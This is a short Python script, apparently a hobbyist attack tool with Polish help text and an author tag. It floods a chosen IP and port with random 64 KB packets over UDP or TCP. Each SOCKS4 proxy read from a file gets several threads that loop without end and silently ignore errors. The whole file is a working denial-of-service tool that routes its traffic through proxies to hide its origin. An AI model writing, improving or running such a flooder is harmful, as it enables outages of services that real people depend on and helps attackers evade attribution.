import argparse
import random
import socket
import socks
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Adres IP docelowego serwera i port oddzielone dwukropkiem, np. 192.168.1.1:8080")
ap.add_argument("-u", "--choice", type=str, default="n", help="Typ protokołu: y dla UDP, t dla TCP")
ap.add_argument("-t", "--times", type=int, default=40, help="Liczba wysłanych pakietów")
ap.add_argument("-th", "--threads", type=int, default=10, help="Liczba wątków")
ap.add_argument("-d", "--data_size", type=int, default=64000, help="Rozmiar danych do wysłania")
args = vars(ap.parse_args())

print("--> Kod autorstwa marcinek <--")

ip_port = args['ip'].split(':')
ip = ip_port[0]
port = int(ip_port[1])
choice = args['choice']
times = args['times']
threads = args['threads']
data_size = args['data_size']

def run(proxy):
    data = random._urandom(data_size)
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            s.set_proxy(socks.SOCKS4, proxy[0], proxy[1])  # Ustawienie proxy SOCKS4
            s.connect((ip, port))
            s.sendall(data)
            s.close()
        except Exception as e:
            pass

def run2(proxy):
    data = random._urandom(data_size)
    while True:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(socks.SOCKS4, proxy[0], proxy[1])  # Ustawienie proxy SOCKS4
            s.connect((ip, port))
            s.sendall(data)
            for x in range(times):
                s.sendall(data)
            s.close()
        except Exception as e:
            pass

def load_proxies(filename):
    proxies = []
    with open(filename, 'r') as file:
        lines = file.readlines()
        for line in lines:
            proxy_data = line.strip().split(':')
            if len(proxy_data) == 2:
                proxies.append((proxy_data[0], int(proxy_data[1])))
    return proxies

# Wczytanie listy proxy z pliku
proxy_list = load_proxies('working_proxy.txt')

# Uruchomienie wątków dla każdego proxy
for proxy in proxy_list:
    for _ in range(threads):
        if choice == 'y':
            th = threading.Thread(target=run, args=(proxy,))
            th.start()
        else:
            th = threading.Thread(target=run2, args=(proxy,))
            th.start()
